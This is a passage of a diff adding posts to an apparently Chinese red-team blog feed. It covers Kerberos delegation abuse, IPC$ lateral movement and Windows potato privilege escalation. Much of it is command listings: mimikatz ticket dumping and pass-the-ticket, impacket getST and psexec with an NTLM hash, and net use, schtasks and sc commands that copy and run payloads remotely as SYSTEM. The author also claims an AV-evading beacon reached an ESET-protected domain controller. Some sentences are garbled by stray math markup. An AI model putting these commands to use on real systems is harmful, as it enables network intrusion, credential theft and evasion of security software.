+<p>利用核心就是获得可转发的ticket票据</p>
+</blockquote>
+<h3 id="工具利用-2">工具利用</h3>
+<p>kekeo</p>
+<ol>
+<li>发现域内配置了约束性委派的服务账号</li>
+</ol>
+<pre><code class="language-bash">Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
+</code></pre>
+<ol start="2">
+<li>读取密码</li>
+<li>生成一个tgt</li>
+</ol>
+<pre><code class="language-bash">明文密码
+tgt::ask /user:lisi$ /domain:test.com /password:xxxxxx
+
+拥有账户hash
+tgt::ask /user:lisi$ /domain:test.com /NTLM:497114015b3695d77441431ae90b78e3
+
+</code></pre>
+<ol start="4">
+<li>将得到的ticket导入到内存：<br>
+打开mimikatz先privilege::Debug然后执行下面命令：</li>
+</ol>
+<pre><code class="language-bash">kerberos::ptt 555.kirbi
+</code></pre>
+<ol start="5">
+<li>访问zhangsan的cifs服务看是否成功：</li>
+</ol>
+<pre><code class="language-bash">dir \\zhangsan\c$
+</code></pre>
+<p>如果即不知道明文也不知道hash，但是有了服务用户的主机权限<br>
+可以用mimikatz从内存中把服务用户的tgt dump出来</p>
+<pre><code class="language-bash">sekurlsa::tickets /export
+
+tgs::s4u /tgt:[0;3e7]-2-1-40e10000-LISI$@krbtgt-TEST.COM.kirbi /user:Administrator@test.com /service:cifs/zhangsan.test.com
+
+
+将ticket导入内存
+kerberos::ptt 333.kirbi
+
+dir \\zhangsan.test.com\c$
+
+</code></pre>
+<pre><code class="language-bash">python getST.py -dc-ip 192.168.124.142 -spn cifs/zhangsan -impersonate administrator test.com/lisi$ -hash :497114015b3695d77441431ae90b78e3
+set KRB5CCNAME=administrator.ccache
+python psexec.py -no-pass -k zhangsan
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1645496417039-726c8d09-c720-4d9e-a85a-bf409227cd9f.png" alt="image.png" loading="lazy"></figure>
+<p>](https://blog.csdn.net/qq_41874930/article/details/110633298)</p>
+<pre><code class="language-bash">发现s4u2proxy阶段失败但是s4u2self阶段成功
+
+失败的原因有可能是身份验证的方式选择了只支持kerberos验证。只要更换成“使用任何身份验证协议”即可
+</code></pre>
+<h2 id="基于资源的约束性委派">基于资源的约束性委派</h2>
+<p>传统委派，在设置的过程中其实都是需要SeEnableDelegation特权的，而这个特权需要域管理员才能设置。<br>
+基于资源的约束性委派不需要域管理员设置，而是机器本身</p>
+<h3 id="约束性委派和基于资源的约束性委派的区别">约束性委派和基于资源的约束性委派的区别</h3>
+<p>约束性委派：通过服务A委派到服务B，实际是在服务A上增加了Trusted_for_delegation字段(非约束性委派)，Trusted_toauthenticate_for_delegation和msDS-Allowedtodelegateto(约束性委派) 字段来达到委派的目的<br>
+后者：通过服务B允许服务A委派到服务B,实际上是通过服务B自身赋予msDS-AllowedToActOnBehalfOfOtherIdentity字段，从而允许服务A对服务B的基于资源的约束委派。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[IPC共享链接上线eset域控]]></title>
+        <id>https://pyroxenites.github.io/post/ipc-gong-xiang-lian-jie-shang-xian-eset-yu-kong/</id>
+        <link href="https://pyroxenites.github.io/post/ipc-gong-xiang-lian-jie-shang-xian-eset-yu-kong/">
+        </link>
+        <updated>2022-05-20T05:30:44.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>虽然说上线eset，其实没啥新技术，主要是木马是免杀的，用的API Hash＋直接syscall，以及CS4.4 beacon stagerless 因为CS4.2估计被卡巴识别了，同样技术CS4.4可以，但CS4.2不可以</p>
+</blockquote>
+<h2 id="前言">前言</h2>
+<p>Ipc$(internet process connection)是共享&quot;命名管道&quot;的资源，是为了让进程间通信而开放的命名通道， 可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p>
+<h2 id="ipc作用">IPC作用</h2>
+<p>利用IPC$，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。</p>
+<h2 id="利用条件">利用条件</h2>
+<ol>
+<li>139、445端口开启</li>
+</ol>
+<ul>
+<li>SMB: (Server Message Block) Windows协议族，用于文件打印共享的服务；</li>
+<li>NBT: (NETBios Over TCP/IP)使用137（UDP）138（UDP）139（TCP）端口实现基于TCP/IP协议的NETBIOS网络互联。</li>
+<li>在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现</li>
+</ul>
+<p>对于win2000客户端（发起端）来说：</p>
+<ul>
+<li>如果在允许NBT的情况下连接服务器时，客户端会同时尝试访问139和445端口，如果445端口有响应，那么就发送RST包给139端口断开连接，用455端口进行会话，当445端口无响应时，才使用139端口，如果两个端口都没有响应，则会话失败；</li>
+<li>如果在禁止NBT的情况下连接服务器时，那么客户端只会尝试访问445端口，如果445端口无响应，那么会话失败。</li>
+</ul>
+<p>对于win2000服务器端来说：</p>
+<ul>
+<li>如果允许NBT, 那么UDP端口137, 138, TCP 端口 139, 445将开放（LISTENING）；</li>
+<li>如果禁止NBT，那么只有445端口开放。</li>
+</ul>
+<p>我们建立的IPC会话对端口的选择同样遵守以上原则。显而易见，如果远程服务器没有监听139或445端口，IPC会话是无法建立的。</p>
+<h3 id="总结">总结</h3>
+<p>ipc<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">连</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">实</mi><mi mathvariant="normal">现</mi><mi mathvariant="normal">远</mi><mi mathvariant="normal">程</mi><mi mathvariant="normal">登</mi><mi mathvariant="normal">陆</mi><mi mathvariant="normal">及</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">默</mi><mi mathvariant="normal">认</mi><mi mathvariant="normal">共</mi><mi mathvariant="normal">享</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">访</mi><mi mathvariant="normal">问</mi><mo separator="true">;</mo><mi mathvariant="normal">而</mi><mn>139</mn><mi mathvariant="normal">端</mi><mi mathvariant="normal">口</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">开</mi><mi mathvariant="normal">启</mi><mi mathvariant="normal">表</mi><mi mathvariant="normal">示</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi>b</mi><mi>i</mi><mi>o</mi><mi>s</mi><mi mathvariant="normal">协</mi><mi mathvariant="normal">议</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">应</mi><mi mathvariant="normal">用</mi><mo separator="true">,</mo><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mn>139</mn><mo separator="true">,</mo><mn>445</mn><mi mathvariant="normal">端</mi><mi mathvariant="normal">口</mi><mi mathvariant="normal">实</mi><mi mathvariant="normal">现</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">共</mi><mi mathvariant="normal">享</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">打</mi><mi mathvariant="normal">印</mi><mi mathvariant="normal">机</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">访</mi><mi mathvariant="normal">问</mi><mo separator="true">,</mo><mi mathvariant="normal">因</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">般</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">讲</mi><mo separator="true">,</mo><mi>i</mi><mi>p</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">连接可以实现远程登陆及对默认共享的访问;而139端口的开启表示 netbios协议的应用,我们可以通过139,445端口实现对共享文件/打印机的访问,因此一般来讲,ipc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">连</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">远</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">登</span><span class="mord cjk_fallback">陆</span><span class="mord cjk_fallback">及</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">默</span><span class="mord cjk_fallback">认</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">享</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">而</span><span class="mord">1</span><span class="mord">3</span><span class="mord">9</span><span class="mord cjk_fallback">端</span><span class="mord cjk_fallback">口</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">启</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">协</span><span class="mord cjk_fallback">议</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">用</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord">1</span><span class="mord">3</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">5</span><span class="mord cjk_fallback">端</span><span class="mord cjk_fallback">口</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">享</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord">/</span><span class="mord cjk_fallback">打</span><span class="mord cjk_fallback">印</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">般</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">讲</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">c</span></span></span></span>连接是 需要139或445端口来支持的<br>
+<img src="https://pyroxenites.github.io/post-images/1650173805780-ba9b7a22-aa0f-4ea1-bfcf-826e84d55605.png" alt="image.png" loading="lazy"></p>
+<ol start="2">
+<li>管理员开启了默认共享：默认共享是为了方便管理员远程管理而默认开启的共享,即所有的逻辑盘 （c<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo separator="true">,</mo><mi>d</mi></mrow><annotation encoding="application/x-tex">,d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span></span></span></span>...）和系统目录windows(admin<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>)</mo><mo separator="true">,</mo><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>i</mi><mi>p</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">),我们通过ipc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">c</span></span></span></span>连接可以实现对这些默认共享的访问。</li>
+</ol>
+<h2 id="连接">连接</h2>
+<pre><code class="language-python">net use \\127.0.0.1\ipc$ &quot;password&quot; /user:&quot;username&quot; #建立连接
+net use \\127.0.0.1\c$ &quot;password&quot; /user:&quot;username&quot;
+net use #查看存在的连接
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1650104252889-c668c2c4-3221-49aa-b286-9f230efce751.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650104632849-5ea11f1e-b0f1-4195-b5c5-86093d34a563.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650105224516-36652b9c-c4b8-4959-8866-0239a11a4654.png" alt="image.png" loading="lazy"></p>
+<h2 id="cs小技巧">CS小技巧</h2>
+<p>CS的文件浏览功能是带token的，直接通过一个域管权限的session，只要目标PC 445开启，直接\xx.xx.xx.xx\C<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \D at position 15: 、\\xx.xx.xx.xx\̲D̲'>、\\xx.xx.xx.xx\D</span> 方便极了。</p>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1650109324843-484310ba-c36a-4fbf-9a6c-8ff561c75f18.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>这里由于卡巴那台机器出了点小状况,便用LN师傅图进行讲解</p>
+</blockquote>
+<h2 id="常用命令">常用命令</h2>
+<pre><code class="language-python">0.建立空连接
+net use \\192.168.1.1\ipc$ &quot;&quot; /u:&quot;&quot;
+
+1.建立正常连接
+net use \\192.168.1.1\ipc$ &quot;1qaz@WSX&quot; /user:&quot;Administrator&quot; 
+
+2.查看本机连接共享情况
+net use
+
+3.查看已建立连接目标主机的共享资源
+net view \\192.168.1.1
+
+4.查看目标主机时间
+net time \\192.168.1.1
+
+5.查看目标主机的NetBIOS用户（自己本机也需开启）
+nbtstat -A 192.168.1.1
+
+6.删除本机与指定ip建立的连接
+net use \\192.168.1.1\ipc$ /del /y
+
+7.删除本机所有已建立的连接
+net use * /del /y
+
+8.文件的上传下载
+copy plugin_update.exe \\192.168.1.1\c$\windows\temp\plugin_update.exe
+[推荐用xcopy]:
+xcopy d:\sqlitedata\*.* \\192.168.1.1\c$\temp /E /Y /D
+（上传本地文件到目标的:c\windows\temp\目录下）
+copy \\192.168.1.1\c$\plugin_update.exe c:\
+（下载目标文件到本地c盘下）
+
+9.创建计划任务之schtasks
+schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+立即执行计划任务
+schtasks /run /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+删除计划任务
+schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+计划任务远程开启默认共享{注意查看目标主机时间}
+schtasks /create /tn &quot;plugin_update&quot; /tr &quot;cmd /c net share c$=c:&quot; /sc once /st 16:25 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+10.创建计划任务之at
+（at只支持win03和部分老版本win08，一般情况下，win08-SP1的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）
+at \\192.168.1.1 14:05 cmd /c &quot;c:\windows\temp\test.bat&quot; 
+
+11.SC创建服务
+（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报1053错误）
+sc \\192.168.1.1 create shellsrv binpath= &quot;c:\shell.exe&quot; start= auto displayname= &quot;shellstart&quot;
+sc \\192.168.1.1 create test binpath= &quot;c:\windows\temp\test.bat&quot; start= auto displayname= &quot;shellstart&quot;
+sc \\192.168.1.1 start shllsrv
+sc \\192.168.1.1 stop shllsrv
+sc \\192.168.1.1 delete shellsrv
+
+12.删除默认共享
+net share c$ /del
+
+13.恢复默认共享
+net share c$=c:
+
+15.对方的c盘映射为自己的z盘，其他盘类推(不推荐)
+net use z: \\192.168.1.1\c$ &quot;1qaz@WSX&quot; /user:&quot;administrator&quot;
+
+16.删除映射的c盘，其他盘类推
+net use c: /del
+</code></pre>
+<h2 id="上线">上线</h2>
+<pre><code class="language-python">tasklist /S 192.168.10.131 /U administrator -P 密码
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1650105725185-fdf0a9fd-a894-45b3-a61f-19681f2fd8f4.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650105737771-bf0ef12d-1101-469b-a670-85ffdc3ae63c.png" alt="image.png" loading="lazy"><br>
+eset哦，好兄弟</p>
+<h3 id="方法一">方法一</h3>
+<ul>
+<li>查看目标系统时间：net time \192.168.10.131</li>
+<li>将本目录下的指定文件复制到目标系统中：copy vps.exe \192.168.10.131\c$</li>
+<li>使用at创建计划任务：at \192.168.10.131 17:00:00 C:\vps.exe</li>
+<li>清除at记录：at \192.168.10.131 作业ID /delete</li>
+<li>使用at命令执行，将执行结果写入本地文本文件，再使用type命令查看该文件的内容：at \192.168.10.131 17:00:00 cmd.exe /c &quot;ipconfig &gt; C:/1.txt &quot;</li>
+<li>查看生成的1.txt文件：type \192.168.10.131\C$\1.txt</li>
+</ul>
+<h3 id="方法二">方法二</h3>
+<p>Windows Vista、Windows Server 2008及之后版本的操作系统已经弃用at命令，而转为用schtasks命令<br>
+故第一种不做演示</p>
+<pre><code class="language-python">在目标主机上创建一个名为test的计划任务，启动程序为C:\vps.exe，启动权限为system，启动时间为每隔一小时启动一次
+schtasks /create /s 192.168.10.131 /tn test /sc HOURLY /mo 1 /tr c:\vps.exe /ru system /f
+
+其他启动时间参数：
+/sc onlogon  用户登录时启动
+/sc onstart  系统启动时启动
+/sc onidle   系统空闲时启动
+
+查询该test计划任务
+schtasks /query | findstr test
+
+启动该test计划任务
+schtasks /run /s 192.168.10.131 /i /tn &quot;test&quot;
+
+删除该test计划任务
+schtasks /delete /s 192.168.10.131 /tn &quot;test&quot; /f
+
+sc命令创建计划任务
+copy test.exe \\192.168.10.20\c$
+sc \\192.168.10.20 create test binpath= &quot;c:\test.exe&quot;
+sc \\192.168.10.20 start test
+sc \\192.168.10.20 del test
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1650108425736-d2064df1-2d88-469f-9371-731581dd96f1.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650108437215-d28715ad-a1de-4928-ae05-f4d06d3d903f.png" alt="image.png" loading="lazy"></p>
+<p>这里如果是360的话，估计schtasks会拦截，这个eset没有拦截</p>
+<h2 id="常见错误号">常见错误号</h2>
+<pre><code class="language-python">错误号 5，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】
+错误号 51，Windows 无法找到网络路径【网络有问题】
+错误号 53，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）】
+错误号 67，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】
+错误号 1219，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc$，请删除后再连】
+错误号 1326，未知的用户名或错误密码【原因很明显了】
+错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型
+---
+情况1：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：
+开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户
+情况2：
+(1)网络访问为：经典
+(2)来宾账户状态：已启用，
+(3)拒绝从网络访问这台计算机里有Guest用户或组
+(4)你执行net use \\xxx.xxx.xxx.xxx\IPC$ &quot;123456&quot; /user:&quot;xxx&quot; 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误
+---
+错误号 1792，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】
+错误号 2242，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】
+</code></pre>
+<h2 id="关闭共享">关闭共享</h2>
+<pre><code class="language-python">net  share  ipc$    /delete              关闭ipc默认共享
+net  share  c$      /delete              关闭C盘默认共享
+net  share  admin$  /delete              关闭admin$默认共享
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[windows提权]]></title>
+        <id>https://pyroxenites.github.io/post/windows-ti-quan/</id>
+        <link href="https://pyroxenites.github.io/post/windows-ti-quan/">
+        </link>
+        <updated>2022-05-10T05:36:40.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="实战1">实战1</h1>
+<h2 id="查看数据库提权">查看数据库提权</h2>
+<p>net user 观察，sqlserver账号做了降权处理<br>
+<img src="https://pyroxenites.github.io/post-images/1650094697769-2ceff2ca-875e-4e05-9b03-73f8c24b4bb6.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650005080507-bce2931b-ef1a-4a12-a9cf-ab972cfd3619.png" alt="image.png" loading="lazy"></p>
+<h2 id="权限">权限</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1649990120665-aea1b166-37cb-40e3-9df5-3e089b20b8e2.png" alt="image.png" loading="lazy"><br>
+看到IIS和SeAssignPrimaryTokenPrivilege很容易联想到土豆家族的提权</p>
+<h2 id="效果">效果</h2>
+<p>先看结果<br>
+CS中的getsystem<br>
+<img src="https://pyroxenites.github.io/post-images/1649990365773-aef0036a-31f4-4c4b-9176-895d788c1ebd.png" alt="image.png" loading="lazy"><br>
+失败了<br>
+CS中的GetSystem具体原理是什么</p>
+<blockquote>
+<p><a href="https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/">https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/</a></p>
+</blockquote>
+<p>SweetPotato和JuicyPotato效果<br>
+<img src="https://pyroxenites.github.io/post-images/1649990449311-92052b37-fe0c-4fd3-ae08-28b70891325b.png" alt="image.png" loading="lazy"><br>
+也都是失败了</p>
+<p>再来看看Badpotato也就是Csharp版本的pipepotato<br>
+<img src="https://pyroxenites.github.io/post-images/1649990498804-2a147fdb-e456-4456-8b43-3d867789b199.png" alt="image.png" loading="lazy"><br>
+这个成功了<br>
+不过利用哥斯拉自带的Badpotato的效果就不一样了<br>
+<img src="https://pyroxenites.github.io/post-images/1649990587340-5b405c77-ef7b-4ba6-bf77-ebe09fa50041.png" alt="image.png" loading="lazy"><br>
+pipepotato简单的原理就是<br>
+createNamedPipe()创建一个命令管道，调用ConnectNamedepipe()等待clinet连接，迫使高权限进程连接命令管道并写入数据，调用ImpersonateNamedPipeClient()，派生一个高权限进程的客户端</p>
+<p>其实看到这样原理很容易会联想到MSF的getsystem的原理</p>
+<p>Windows服务已启动，导致与命名管道建立连接，该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌，然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程</p>
+<p>这里上线的时候直接卡死，故放弃此项实验<br>
+<img src="https://pyroxenites.github.io/post-images/1650694627968-2de72989-930e-4862-9b0f-5f415dfb32fd.png" alt="image.png" loading="lazy"><br>
+不过Badpotato通杀效果确实好一些</p>
+<h2 id=""></h2>
+<blockquote>
+<p><a href="https://github.com/Ascotbe/Kernelhub/blob/master/README.CN.md">https://github.com/Ascotbe/Kernelhub/blob/master/README.CN.md</a></p>
+</blockquote>
+<h1 id="实战2">实战2</h1>
+<p><img src="https://pyroxenites.github.io/post-images/1650690658633-515fd665-9d0a-458a-944f-3ea102183e06.png" alt="image.png" loading="lazy"><br>
+我们通过不是sa权限的os-shell进去以后，发现是IIS权限<br>
+一般猜测是被黑了</p>
+<pre><code class="language-java">Get-Acl -Path HKLM:\SAM\SAM | Format-List
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1650690737760-21fb8e61-32d1-4fdd-9bce-a8c385cc3c20.png" alt="image.png" loading="lazy"><br>
+反弹shell以后进行查看，发现确实有被黑过的痕迹，因为SAM注册表一般默认只有System具备完全控制权，管理员一般不会修改，一般可作为后门使用<br>
+这里使用post/windows/gather/hashdump，发现可以读取出Hash，但感觉使用中的MSF有问题<br>
+所以只是觉得是一个思路<br>
+<img src="https://pyroxenites.github.io/post-images/1650693661375-4251c2da-dee9-4e56-a09c-5962bb2e1800.png" alt="image.png" loading="lazy"></p>
+<h1 id="实战3">实战3</h1>
+<p>通过读取配置文件<br>
+<img src="https://pyroxenites.github.io/post-images/1650693951078-13949fbb-bcfe-4e3e-927b-ab8b883daa7c.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650693934454-21dd4ab4-c1d9-458d-a9e3-3952b8f80821.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650693988674-8e2aa0d7-6f18-4287-88e4-53bdde85c65e.png" alt="image.png" loading="lazy"><br>
+在web配置文件中找到了sa权限的数据库密码，可利用进行提权</p>
+<h1 id="原理">原理</h1>
+<blockquote>
+<p>在一个红队面试题看到了</p>
+</blockquote>
+<h2 id="前言">前言</h2>
+<p>俗称的Rotten 	Potato(烂土豆)提权就是MS16-075</p>
+<p>可将windows工作站上的特权从最低级别提升到最高级别,即NT AUTHORITY\SYSTEM 权限</p>
+<blockquote>
+<p>https://github.com/foxglovesec/RottenPotato</p>
+</blockquote>
+<blockquote>
+<p>是一个本地提权,是针对本地用户的,不能用于域用户</p>
+</blockquote>
+<p>官方漏洞通知:<br>
+<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2016/ms16-075">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2016/ms16-075</a></p>
+<p>Windows SMB服务器特权提升漏洞(CVE-2016-3225),当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,_Microsoft服务器消息块(SMB)中存在特权提升漏洞,成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。_若利用此漏洞,攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受到影响的系统。</p>
+<blockquote>
+<p>此更新通过更正windows服务器消息快(SMB)服务器处理凭据转发请求的方式来修复此漏洞<br>
+微软将其定义为KB3164038</p>
+</blockquote>
+<h2 id="简单原理">简单原理</h2>
+<ol>
+<li>欺骗&quot;NT AUTHORITY\SYSTEM&quot;账户通过NTLM认证到控制的TCP终端</li>
+<li>对这个认证过程使用_中间人攻击(NTLM重放),为&quot;NT AUTHORITY\SYSTEM&quot;_账户本地协商一个安全令牌。这个过程通过一系列的windows api调用实现的。</li>
+<li>模仿这个令牌,只有具有&quot;模仿安全令牌权限&quot;的账户才能去模仿别人令牌,一般大多数服务型账户(IIS,MSSQL等)都有这个权限,用户级账户大多数没有这个权限</li>
+</ol>
+<blockquote>
+<p>一般从web拿到的webshell都是IIS服务器权限,具有这个模仿权限</p>
+</blockquote>
+<h2 id="提权条件">提权条件</h2>
+<blockquote>
+<p>利用Potato提权的是前提是拥有<strong>SeImpersonatePrivilege</strong>或<strong>SeAssignPrimaryTokenPrivilege</strong>权限<br>
+一般用户拥有SelmpersonatePrivilege(而只有更高权限的账户比如SYSTEM才有SeAssignPrimaryTokenPrivilege权限)</p>
+</blockquote>
+<p>以下用户拥有该权限</p>
+<blockquote>
+<ul>
+<li>本地管理员组成员和本地服务帐户</li>
+<li>由服务控制管理器启动的服务</li>
+<li>由组件对象模型 (COM) 基础结构启动的并配置为在特定帐户下运行的COM服务器</li>
+</ul>
+</blockquote>
+<pre><code class="language-csharp">whoami /priv
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1647393681789-ac465566-f471-47c1-9cb8-616274379e8e.png" alt="image.png" loading="lazy"></figure>
+<h2 id="多汁土豆提权">多汁土豆提权</h2>
+<pre><code class="language-csharp">https://github.com/ohpe/juicy-potato
+</code></pre>
+<h3 id="前置知识">前置知识</h3>
+<blockquote>
+<ol>
+<li>使用DCOM时，如果以服务的方式远程连接，那么权限为System，例如BITS服务</li>
+<li>使用DCOM可以通过TCP连接到本机的一个端口，发起NTLM认证，该认证可以被重放</li>
+<li>LocalService用户默认具有SeImpersonate和SeAssignPrimaryToken权限</li>
+<li>开启SeImpersonate权限后，能够在调用CreateProcessWithToken时，传入新的Token创建新的进程</li>
+<li>开启SeAssignPrimaryToken权限后，能够在调用CreateProcessAsUser时，传入新的Token创建新的进程</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>1、加载COM，发出请求，权限为System<br>
+在指定ip和端口的位置尝试加载一个COM对象。<br>
+RottenPotatoNG使用的COM对象为BITS，CLSID为**{4991d34b-80a1-4291-83b6-3328366b9097}**<br>
+可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：<br>
+<a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
+<p>2、回应步骤1的请求，发起NTLM认证<br>
+正常情况下，由于权限不足，当前权限不是System，无法认证成功。</p>
+<p>3、针对本地端口，同样发起NTLM认证，权限为当前用户<br>
+由于权限为当前用户，所以NTLM认证能够成功完成。<br>
+RottenPotatoNG使用的135端口。<br>
